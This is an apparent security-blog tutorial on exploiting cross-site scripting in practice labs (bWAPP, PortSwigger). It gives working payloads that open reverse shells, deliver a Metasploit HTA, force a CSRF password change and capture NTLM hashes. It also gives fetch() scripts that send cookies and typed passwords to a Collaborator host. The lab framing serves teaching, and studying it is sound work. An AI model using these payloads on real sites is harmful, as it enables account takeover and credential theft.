<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Cross-Site Scripting Exploitation</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/cross-site-scripting-exploitation/" rel="bookmark"><time class="entry-date published" datetime="2020-08-14T22:06:19+00:00">August 14, 2020</time><time class="updated" datetime="2025-05-25T16:06:41+00:00">May 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><em>“Are you one of them, who thinks that Cross-Site Scripting is just for some errors or pop-ups on the screen?” Yes?? </em>Then today in this article, you’ll see how an XSS suffering web-page is not only responsible for the defacement of the web-application but also, it could disrupt a visitor’s privacy by sharing the login credentials or his authenticated cookies to an attacker without his/her concern.</span></p>
<p><span style="color: #000000;">I recommend, to revisit our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-on-cross-site-scripting-xss/">previous article</a></strong></span> for better understanding, before going deeper with the<strong> attack scenarios </strong>implemented in this section.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Introduction to Cross-Site Scripting</span></li>
<li><span style="color: #000000;">XSS Post Exploitation</span>
<ul>
<li><span style="color: #000000;">XSS through File Upload</span></li>
<li><span style="color: #000000;">Reverse Shell with XSS</span></li>
<li><span style="color: #000000;">System Exploitation over XSS</span></li>
<li><span style="color: #000000;">CSRF with XSS</span></li>
<li><span style="color: #000000;">NTLM Hash Capture with XSS</span></li>
<li><span style="color: #000000;">Session Hijacking with Burp Collaborator</span></li>
<li><span style="color: #000000;">Credential Capturing with Burp Collaborator</span></li>
<li><span style="color: #000000;">XSS to SQL Injection</span></li>
</ul>
</li>
</ul>
<h3><span style="color: #800000;">Introduction to Cross-Site Scripting</span></h3>
<p><span style="color: #000000;"><strong>C</strong>ross-<strong>S</strong>ite <strong>S</strong>cripting is a client-side code injection attack where malicious <strong>scripts</strong> <strong>are</strong> <strong>injected</strong> <strong>into</strong> <strong>trusted</strong> <strong>websites</strong>.</span></p>
<p><span style="color: #000000;">In this attack, <strong>the users are not directly targeted through a payload</strong>, although the attacker shoots the XSS vulnerability by <strong>inserting a malicious script into a web page</strong> that appears to be a genuine part of the website. So, when any user visits that website, the XSS suffering web-page will deliver the malicious JavaScript code directly over to his browser without his knowledge.</span></p>
<p><span style="color: #000000;"> <strong>“XSS” </strong>thus has been classified into three main categories<strong>:</strong></span></p>
<ul>
<li><span style="color: #000000;">Stored XSS</span></li>
<li><span style="color: #000000;">Reflected XSS</span></li>
<li><span style="color: #000000;">DOM-based XSS</span></li>
</ul>
<p><span style="color: #000000;">I guess you’re now having a clear vision about -“What is XSS” and “How it occurs”. So let’s try to exploit the vulnerable labs over <strong><a style="color: #000000;" href="https://portswigger.net/web-security/cross-site-scripting/exploiting">The Portswigger Academy</a></strong> and <strong>bWAPP</strong> in order to capture up the authenticated cookie of the users and the server’s remote shell.</span></p>
<p><span style="color: #000000;">But before making our hands wet with the exploits, let’s understand what is <strong>Blind XSS?</strong></span></p>
<h4><span style="color: #800000;">Blind XSS</span></h4>
<p><span style="color: #000000;">Many times the <strong>attacker</strong> <strong>does</strong> <strong>not</strong> <strong>know</strong> where the <strong>payload</strong> will <strong>end</strong> <strong>up</strong> and if, or <strong>when</strong>, <strong>it will get executed</strong> and even there are times when the injected payload is executed in a different environment i.e. either by the administrator or by someone else.</span></p>
<p><span style="color: #000000;">So, in order to <strong>exploit</strong> <strong>such</strong> <strong>vulnerabilities</strong> – He blindly <strong>deploys</strong> up the <strong>series</strong> of <strong>malicious</strong> <strong>payloads</strong> over onto the web-applications, and thus the application stores them into the database. Thereby<strong>, </strong>he thus waits, until the user pulls the payload out from the database and renders it up into his/her browser.</span></p>
<p><span style="color: #000000;"><strong>Let’s Start !!</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ww_33K_s8ZM/XzxJfAPYqYI/AAAAAAAAnYM/NA3j82o_dZUTXy65FHwc0wY0C2diL3LAwCLcBGAsYHQ/s1600/0.0.png"/></p>
<h3><span style="color: #800000;">XSS through File Upload</span></h3>
<p><span style="color: #000000;">Web-applications somewhere or the other <strong>allow</strong> <strong>its</strong> <strong>users</strong> <strong>to</strong> <strong>upload</strong><strong> a</strong> <strong>file</strong>, whether its an image, a resume, a song, or anything specific. And with every upload, the name reflects back on the screen as it was called from the HTML code.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--T0nUD6JDKQ/XzcEWezKSDI/AAAAAAAAnOo/dVfCxFQ-NtgTO5BVkiiy3so9vlSj9E8TACLcBGAsYHQ/s1600/0.png"/></p>
<p><span style="color: #000000;">As the name appears back, therefore we can now execute any JavaScript code by simply manipulating up the file name with any XSS payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">"&gt;&lt;img src=x onerror=prompt(1)&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-kpQsXCy0aBk/XzcEZ9d9BUI/AAAAAAAAnOs/8GyZKyG4RR0SSyzcp6lrEy-pmKzh4LdYgCLcBGAsYHQ/s1600/1.png"/></p>
<p><span style="color: #000000;">Boot back into the bWAPP’s application by selecting the <strong>“Choose your bug” </strong>option to <strong>“Unrestricted File Upload” </strong>and for this time we’ll keep the security to <strong>“High”.</strong></span></p>
<p><span style="color: #000000;">Let’s now upload our renamed file over into the web-application, by browsing it from the directory.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-iSNmkSal8OQ/XzcEd9f1v4I/AAAAAAAAnOw/TuQsa-A_5zM8R3EyM4pn8GCrrfdcjiwtwCLcBGAsYHQ/s1600/2.png"/></p>
<p><span style="color: #000000;">Great !! Form the above image, you can see that our file name is over on the screen. So as we hit the <strong>Upload </strong>button, the browser will execute up the embedded JavaScript code and we’ll get the response.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NVBz-Qbfybw/XzcEhmlx01I/AAAAAAAAnO0/pAGbJXiDTOoZiCs2XdeseoK8MQFiBNIxgCLcBGAsYHQ/s1600/3.png"/></p>
<h3><span style="color: #800000;">Reverse Shell with XSS</span></h3>
<p><span style="color: #000000;">Generating a <strong>pop-up</strong> or <strong>redirecting</strong> a <strong>user</strong> to some different application with the XSS vulnerability is somewhere or the other seems to be harmless. But what, if the attacker is able to capture up a reverse shell, will It still be harmless? Let’s see how we could do this.</span></p>
<p><span style="color: #000000;">Fire up your Kali terminal and then create up a reverse-php payload by calling it from <strong>webshells </strong> directory as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp /usr/share/webshells/php/php-reverse-shell.php /root/Desktop/ReverseXSS.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bCg3hODJI3M/XzcEkyXYXHI/AAAAAAAAnO4/COXwfjTblfA2nH3AO_QGhD82GBVHxM9uACLcBGAsYHQ/s1600/9.png"/></p>
<p><span style="color: #000000;">Now, in order to capture the remote shell, let’s manipulate the <strong>$ip</strong> parameter with the Kali machine’s IP</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0PrhoEoxFYE/XzcEoVui-qI/AAAAAAAAnO8/Yh7yVprbdlkV01KP3zaZ0vh2GKCMTHW3wCLcBGAsYHQ/s1600/10.png"/></p>
<p><span style="color: #000000;">Back into the vulnerable application, let’s opt the <strong>“Unrestricted File Upload” </strong>and then further we’ll include the <strong>ReverseXSS.php </strong>file.</span></p>
<p><span style="color: #000000;"><em>Don’t forget to copy the Uploaded URL, i.e. <strong>right-click</strong> on the Upload button and choose the <strong>Copy Link Location.</strong></em></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-9DWqysXSHDs/XzcEruMKrqI/AAAAAAAAnPA/s1Gt9cgEbcs8E38F4L7BA7K0mVe9dvqFQCLcBGAsYHQ/s1600/11.png"/></p>
<p><span style="color: #000000;">Great!! We’re almost done, time to inject our XSS payload. Now, with the <strong>“Choose you bug” </strong>option, opt the <strong>XSS – Stored (Blog). </strong></span></p>
<p><span style="color: #000000;">Over into the comment section, type your JavaScript payload with the “File-Upload URL”.</span></p>
<p><span style="color: #000000;">But wait!! Before firing the submit button, let’s start our <strong>Netcat</strong> <strong>listener</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 1234</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bEZDinq5eCA/XzcEu1XutLI/AAAAAAAAnPI/M-OK_Nngxcc-Y1ABrqblUwNdzaXvAAXkQCLcBGAsYHQ/s1600/12.png"/></p>
<p><span style="color: #000000;">Cool !! From the below image, you can see that, we are into our targeted web-server.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-cpq4OwNbNhk/XzcE1kPRDgI/AAAAAAAAnPQ/tPjppCxngRkF0tMCQ_VWOkOeOPqy22cYQCLcBGAsYHQ/s1600/13.png"/></p>
<p><span style="color: #000000;">I’m sure you might be wondering – <em>Why I made a round trip in order to capture up the <strong>Reverse Shell </strong>when I’m having the <strong>“File Upload” </strong>vulnerability open?</em></span></p>
<p><span style="color: #000000;"><em>Okay!! So, think for a situation, if you upload the file directly and you’ve successfully grabbed up the Reverse shell. But wait!! Over in the victim’s network, your IP is disclosed and you’re almost caught or what if your Ip address is not whitelisted. Then? </em></span></p>
<p><span style="color: #000000;"><em>Over in such a situation, taking the round trip is the most preferable option, as you’ll get the reverse connection into the victim’s server through the authorized user.</em></span></p>
<h3><span style="color: #800000;">System Exploitation Over XSS</span></h3>
<p><span style="color: #000000;">In the last section, we captured the reverse shell, but what, <em>if rather than the server’s shell, the attacker managed to get up the <strong>meterpreter</strong> <strong>session</strong> <strong>of the visitor</strong> who surfs this vulnerable web-page?</em></span></p>
<p><span style="color: #000000;">Let’s check it out how – To make it more clear we’re having:</span></p>
<p><span style="color: #000000;"><strong>Attacker’s machine:</strong> Kali Linux</span></p>
<p><span style="color: #000000;"><strong>Vulnerable Web-application:</strong> bWAPP(bee-box)</span></p>
<p><span style="color: #000000;"><strong>Visitor’s machine: </strong>Windows</span></p>
<p><span style="color: #000000;">So, the attacker first creates up an <strong>hta </strong>file i.e. an <strong>HTML Application </strong>over with the Metasploit framework, that when opened by the victim will thus execute up a payload via Powershell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/hta_server
set srvhost 192.168.0.12
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-wXoQ1eB51Ks/XzxJsKvdHtI/AAAAAAAAnYU/4B0GN9tHfC8thtym-pCjKRGmpNt13fxNACLcBGAsYHQ/s1600/14.png"/></p>
<p><span style="color: #000000;">Great!! He got the payload URL, now what he does is, he simply embed it into the XSS suffering web-page and will wait for the visitor.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;script&gt;window.location='http://192.168.0.12:8080/zV9q9x7Tvl0.hta'&lt;/script&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bOrXg_ydX8E/XzxJwLdztlI/AAAAAAAAnYc/LU4U52oKIK8G7bOO4mVQ8EHaBjXyRRaYACLcBGAsYHQ/s1600/15.png"/></p>
<p><span style="color: #000000;">Now, whenever any visitor visits this web-page, the browser will thus execute the malicious script and will download the <strong>HTA</strong> <strong>file</strong> over into his machine.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bj8XaK023s4/XzxJ_ku-hWI/AAAAAAAAnYs/sWDVnG7FaGUIJX8t1JKqkZVBw9AFCU6wgCLcBGAsYHQ/s1600/16.png"/></p>
<p><span style="color: #000000;">Cool !! From the above image, you can see that the file has been downloaded into the system. Now, as soon as the victim boots it up to check out what it is, there on the other side, the attacker will get his meterpreter session.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-d0B-Z1p6eNk/XzxKChli-AI/AAAAAAAAnY0/i20n0IRikokIt6MqTbjXJXrhgzDsH53RwCLcBGAsYHQ/s1600/17.png"/></p>
<h3><span style="color: #800000;">CSRF with XSS</span></h3>
<p><span style="color: #000000;"><em>Wouldn’t it great, if you’re able to manipulate the password of the user or the registered email address with your own, without his concern?</em></span></p>
<p><span style="color: #000000;">Web-applications that are <strong>suffering from XSS and CSRF vulnerability</strong> permits you to do so.</span></p>
<p><span style="color: #000000;">Boot inside the vulnerable web-application bWAPP as <strong>bee: bug, </strong>further select <strong>“CSRF (Change Password)” </strong>from the <strong>“Choose your bug” </strong>option.</span></p>
<p><span style="color: #000000;">This selection will thus redirect you to a <strong>CSRF suffering web-page,</strong> where there is an option to change the account password.</span></p>
<p><span style="color: #000000;">So as we enter or sets up a new password, the passing value thus reflects back into the URL as the password is changed to <strong>“12345”.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-pK2CHv9GJRc/XzxKG0yH5QI/AAAAAAAAnY4/zJBr3iEguLUnosoIBMHr76g6T7HpWMxWQCLcBGAsYHQ/s1600/18.png"/></p>
<p><span style="color: #000000;">Copy the password URL and manipulate the <strong>password_new </strong>and the <strong>password_conf values</strong> to the one which we want to set for the visitor. As in our case, I made it to <strong>“ignite”.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.0.14/bWAPP/csrf_1.php?password_new=ignite&amp;password_conf=ignite&amp;action=change</pre>
<p><span style="color: #000000;">Now, its time to inject our script into <strong>the XSS suffering web-page</strong> with the <strong>“image”</strong> tag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;img src=”http://192.168.0.14/bWAPP/csrf_1.php?password_new=ignite&amp;password_conf=ignite&amp;action=change”&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-WddDmPOEKb4/XzxKQ24xYcI/AAAAAAAAnZE/JQjV7d8QZTAIQNY4xsv-N40SmLlBsdDhQCLcBGAsYHQ/s1600/19.png"/></p>
<p><span style="color: #000000;">Now, let’s consider a visitor is surfing the website and he visits this vulnerable section. As soon as he do so, the browser executes the javascript embedded payload and will consider it as a genuine request by the visitor i.e. it will change the password to <strong>“ignite”.</strong></span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-ig24Vr4w1Zo/XzxKVpI4qGI/AAAAAAAAnZI/jEBQXdjY3XUENIELk8oD4MerkMq8wv0KgCLcBGAsYHQ/s1600/20.png"/></strong></span></p>
<p><span style="color: #000000;">Great !! He did that, now whenever he logs in again with his old password, he won’t be able to as his password has been changed without his concern.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-uvjK0gRiIV4/XzxKZW9THXI/AAAAAAAAnZQ/7tB6qUNSBIc6FPFZgHKEmcjS7DRgDF50ACLcBGAsYHQ/s1600/21.png"/></p>
<p><span style="color: #000000;">But the attacker can log in into the account, as he is having the new password i.e. <strong>“ignite”.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-17U0yOWFiis/XzxKclkIAHI/AAAAAAAAnZY/r5PyN9BQfjU0PDJIdbDyfTu3LFcVczNjACLcBGAsYHQ/s1600/22.png"/></p>
<h3><span style="color: #800000;">NTLM Hash Capture with XSS</span></h3>
<p><span style="color: #000000;">An XSS vulnerability is often known for its pop-ups, but sometimes attacker manipulates these pop-up in order to catch up sensitive data of the users i.e. session cookies, account credentials or whatever they wish to.</span></p>
<p><span style="color: #000000;">Here an attacker thus tries to capture the NTLM hashes of the visitors by injecting his malicious Javascript code into the vulnerable application.</span></p>
<p><span style="color: #000000;">In order to carry this up, he enables up the <strong>“Responder” </strong>over in his attacking machine<strong>, </strong>which will thus grab up all the authenticated NTLM hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">responder –I eth0</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Q-ltQBqhWMw/XzxKh8UXWEI/AAAAAAAAnZc/g3xTNCpZgvACgxcxl0itPnKZXG4413CYgCLcBGAsYHQ/s1600/25.png"/></p>
<p><span style="color: #000000;">Further, he simply injects his malicious script into the XSS suffering web-page with an <strong>“iframe”</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;iframe src=http://192.168.0.12/scriptlet.html &lt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-eiT4rcKQoqg/XzxKlIJHjUI/AAAAAAAAnZg/NgV3lWeLywIV0d7mEw2fcMizAdD_ClDyACLcBGAsYHQ/s1600/26.png"/></p>
<p><span style="color: #000000;">Cool !! Its time to wait for the visitor. Now as the visitor visits this web-page he got encountered with a pop-up asking for the credentials.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bRomCH2nv1o/XzxKpGQxXqI/AAAAAAAAnZo/GTOw4QwT4b4JNhtUUJa-zSdBug8n7fM0QCLcBGAsYHQ/s1600/27.png"/></p>
<p><span style="color: #000000;">As soon as he enters his system credentials, the web-page thus reloads and the attacker will have his <strong>NTLM hash</strong>.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-aP8PrSLiYQ8/XzxKsRCymkI/AAAAAAAAnZs/ef_-zo6mXJY4u4EZ9ZZ23SBTtEV-54tuACLcBGAsYHQ/s1600/28.png"/></p>
<p><span style="color: #000000;">It’s not the end. He needs to crack this up. Therefore over in the new terminal, he directed himself to the directory where the hash is stored.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/responder/logs</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-3yqaBNMbDQg/XzxKwB4Bb8I/AAAAAAAAnZw/8cG4lGkw4DMpzkjYdgrROkUNDPs3zig6wCLcBGAsYHQ/s1600/29.png"/></p>
<p><span style="color: #000000;">Further, he makes up a new password file as <strong>“pass.txt”</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nTwPP4BSPos/XzxKz_r-yGI/AAAAAAAAnZ0/I1CzYJ1VcRUI4wobBe34To4RWM5LJpgYgCLcBGAsYHQ/s1600/30.png"/></p>
<p><span style="color: #000000;">Great!! His work is done now. He simply embeds the password file and the hash file over into <strong>“John The Ripper” </strong>and there he’ll get the authorized session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=pass.txt HTTP-NTLMv2-192.168.0.9.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-H1Sx3eTb37E/XzxK3AsZjHI/AAAAAAAAnZ4/nUdCWv2DeFIGE8D3Q9Gbixf3fDPbUWnPgCLcBGAsYHQ/s1600/31.png"/></p>
<h3><span style="color: #800000;">Session Hijacking with Burp Collaborator Client</span></h3>
<p><span style="color: #000000;">As in our previous article, we were <strong>stealing cookies,</strong> but, <strong>impersonating as an authenticated user</strong>, where we’ve kept our <strong>netcat</strong> listener <strong>“ON”</strong> and on the other side we logged in as a genuine user.</span></p>
<p><span style="color: #000000;">But in the real-life scenarios, things don’t work this way, there are times when we could face <strong>blind</strong> <strong>XSS i.e. </strong>we won’t know when our payload will get executed.</span></p>
<h4><span style="color: #000000;">Introducing Burp Collaborator Client</span></h4>
<p><span style="color: #000000;">Thus in order to <strong>exploit</strong> this <strong>Blind</strong> <strong>XSS</strong> <strong>vulnerability,</strong> let’s check out one of the best burpsuite’s plugins i.e. the <strong>“Burp Collaborator Client” </strong></span></p>
<p><span style="color: #000000;">Don’t know what is <strong>Burp</strong> <strong>Collaborator</strong>? Follow up with this section, and I’m sure you’ll get the basic knowledge about it.</span></p>
<p><span style="color: #000000;">Login into the <strong>PortSwigger academy</strong> and drop down till <strong>Cross-Site Scripting</strong> and further get into its <strong>“Exploiting cross-site scripting vulnerabilities”,</strong> choose the first lab as “<strong>Exploiting cross-site scripting to steal cookies” </strong>and hit <strong>“Access the lab”</strong> button.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-qGZwk9oKZqw/XzcE5a8f3TI/AAAAAAAAnPU/o9T2gZQKwFktzq4oFttaDZQa9CuzNWxrACLcBGAsYHQ/s1600/100.png"/></p>
<p><span style="color: #000000;">Here you’ll now be redirected to blog. As to go further, I’ve opened a post there and checked out for its content.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ErCYgIci-gs/XzcE9CiAzWI/AAAAAAAAnPY/ECvkzD-TRSYM-6WqyLYqd569vCxdpVOuQCLcBGAsYHQ/s1600/101.png"/></p>
<p><span style="color: #000000;">While scrolling down, over at the bottom, I found a comment section, which seems to have multiple inputs fields, i.e. there is a chance that we could have an XSS vulnerability exists.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-hmXuU726uh4/XzcFAHNSJ7I/AAAAAAAAnPc/VA70kUKnUFEHBsa32Mzt-_3CiXWQ1lxTACLcBGAsYHQ/s1600/102.0.png"/></p>
<p><span style="color: #000000;">Now its time to bring <strong>“Burp Collaborator Client” </strong>in the picture. Tune in your <strong>“Burpsuite”</strong> and there on the left-hand side click on <strong>“Burp”, </strong>further then opt the <strong>“Burp Collaborator Client”.</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-OlL7soYNWR4/XzcFDPG2ogI/AAAAAAAAnPg/QQ_Uo_5Z_d0Da1QWENDMrlZfnjtV0RPYACLcBGAsYHQ/s1600/102.png"/></strong></span></p>
<p><span style="color: #000000;">Over into the <strong>Collaborator Client window, </strong>at the<strong> “Generate Collaborator payloads”</strong> section, hit the <strong>Copy to clipboard </strong>button which will thus copy a payload for you.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-WAS6mk89Ctc/XzcFGc_5deI/AAAAAAAAnPk/Ca2L1yP1XnMqNlDedGtaEBxoiiawJzEegCLcBGAsYHQ/s1600/103.png"/></strong></span></p>
<h4><span style="color: #000000;">Inject Blind XSS Payload in Comment Section</span></h4>
<p><span style="color: #000000;">Cool!! Now, come back to the <strong>“Comment Section” </strong>into the blog, enter the following script with your <strong>Burp</strong> <strong>Collaborator</strong> payload:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;script&gt;
fetch('https://qgafu1gvgx5psspo9o4iz1e2ttzond.burpcollaborator.net', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
&lt;/script&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-nvyXwVtNvmA/XzcFKo3P_SI/AAAAAAAAnPs/JjYzU1zsU3gFQXhG60nKCkMKI6RTBk0kgCLcBGAsYHQ/s1600/105.png"/></p>
<p><span style="color: #000000;">Great!! From the below image, you can see that our comment has been posted successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Jut8y4-Gkjs/XzcFN7Ah8OI/AAAAAAAAnPw/fsKZkdoVh4EaV-cJOoK5FKU7LGOnA93lQCLcBGAsYHQ/s1600/106.png"/></p>
<p><span style="color: #000000;">Time to wait!! Click on the <strong>Poll </strong>button in order to grab up the payload-interaction result.</span></p>
<p><span style="color: #000000;">Oops!! We got a long list, select the <strong>HTTP one </strong>and check its <strong>“Response”.</strong> From the below image you can see that in the response section we’ve got a <strong>“Session Id”. Copy it for now !!</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-s-joECE6dYU/XzcFZuh2eRI/AAAAAAAAnQA/4ljJ6ylEYlYZT2QelmNbdEOU02WPT1xXwCLcBGAsYHQ/s1600/107.png"/></p>
<h4><span style="color: #000000;">Hijack the Session</span></h4>
<p><span style="color: #000000;">Now, back into the browser, configure your proxy and over in the burpsuite turn you <strong>Intercept</strong> <strong>“ON”. </strong></span></p>
<p><span style="color: #000000;"><strong>Reload </strong>the page and check the intercepted <strong>Request.</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-LXvuZ_CQPkg/XzcFc1k8XNI/AAAAAAAAnQI/1o_6NuPsDjU5vELSeAqa26YvcLjCLQ0OwCLcBGAsYHQ/s1600/108.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Great!!</strong> We’re having a <strong>Session ID</strong> here too, simply <strong>manipulate</strong> it up with the one we <strong>copied</strong> <strong>earlier</strong> from the collaborator.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-6H5lyDI90gc/XzcFfzRpnTI/AAAAAAAAnQQ/JX5ZWyRKDnY3FG0WnOlO9L-IUZtOLeg7gCLcBGAsYHQ/s1600/110.png"/></p>
<p><span style="color: #000000;">Hit the <strong>Forward </strong>button, and check what the web-application offers you.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-MCv0WOhFRGA/XzcFjMjMGEI/AAAAAAAAnQU/JrcHd6fXO6ABii8AF3oDQ6J7xcP55ZzqgCLcBGAsYHQ/s1600/111.png"/></p>
<h3><span style="color: #800000;">Credential Capturing with Burp Collaborator</span></h3>
<p><span style="color: #000000;"><em>Why capture up the session cookies, if you could get the username &amp; passwords directly??</em></span></p>
<p><span style="color: #000000;">Similar to the above section, it’s not necessary, that our payload will execute over at the same place, where it was injected.</span></p>
<p><span style="color: #000000;">Let’s try to capture some credentials over as in some real-life situation, where the web-page is suffering from the <strong>Stored</strong> <strong>XSS</strong> vulnerability.</span></p>
<p><span style="color: #000000;">Back into the <strong>PortSwigger </strong>account choose the next defacement as <strong>“Exploiting cross-site scripting to capture passwords”.</strong></span></p>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-K6dSSvaiBr0/XzcFocEjDgI/AAAAAAAAnQY/iIUPo6y8kMcEnqHhQjNuRiJJgFwA57magCLcBGAsYHQ/s1600/112.png"/></strong></span></p>
<p><span style="color: #000000;">As we hit <strong>“Access The Lab”, </strong>we’ll get redirected to the XSS suffering web-page. To enhance more, I’ve again opened up a <strong>blog-post </strong>there.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ge2q9yzbJiw/XzcFriHhXvI/AAAAAAAAnQc/FTQ2U_KyzG4u3xqxyV_R0OBbOhsBWbgYACLcBGAsYHQ/s1600/113.png"/></p>
<p><span style="color: #000000;">Scrolling the page again, I got encountered with the same <strong>“comment</strong> <strong>section.” </strong>Let’s exploit it out again.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-gmbP9B878nY/XzcFvtkh6hI/AAAAAAAAnQg/CLPRrAefaxsG7k3_-fPP5kRwPE4w1MltwCLcBGAsYHQ/s1600/114.0.png"/></p>
<p><span style="color: #000000;">Back into the <strong>“Burp Collaborator”, </strong>let’s <strong>Copy</strong> the payload again by hitting <strong>“Copy to Clipboard”.</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ia6nWeWo2Rs/XzcFyjJ7yEI/AAAAAAAAnQo/crjkPGroi8ATIL5xbMisvAz7m9ZnlbP7ACLcBGAsYHQ/s1600/114.png"/></p>
<p><span style="color: #000000;">All we need was that payload only, now inject the comment field with the following XSS payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;input name=username id=username&gt;
&lt;input type=password name=password onchange="if(this.value.length)fetch('https://5iojzt7m7e9217idp6s700vah1nsbh.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"&gt;</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_Ret5FO3IV8/XzcF2MOSaFI/AAAAAAAAnQs/jrfGaPmqNrYzIDjQlZqv9y8EM7BsoWHDQCLcBGAsYHQ/s1600/115.png"/></p>
<p><span style="color: #000000;">Let’s hit the <strong>“Post Comment” </strong>in order to check whether it is working or not. The below image clears up that our comment has been posted successfully.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-9muxXDcffqA/XzcF5IfVcYI/AAAAAAAAnQ0/YleljavHK0UTFsjqeyiaeOk6CDJmWg6sACLcBGAsYHQ/s1600/116.png"/></p>
<p><span style="color: #000000;">Now let’s wait over into the <strong>“burp</strong> <strong>Collaborator” </strong>for the results. From the below image you can see that our payload has been executed at some point.</span></p>
<p><span style="color: #000000;">Let’s check who did that.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-OXWJgemrIz0/XzcF8nO1KPI/AAAAAAAAnQ4/WgKW31B63OQKonCQwDKkfrpWWvzum8u7gCLcBGAsYHQ/s1600/120.png"/></p>
<p><span style="color: #000000;">Oops!! It’s the administrator, we’re having some credentials.</span></p>
<p><span style="color: #000000;">But where we could use them?</span></p>
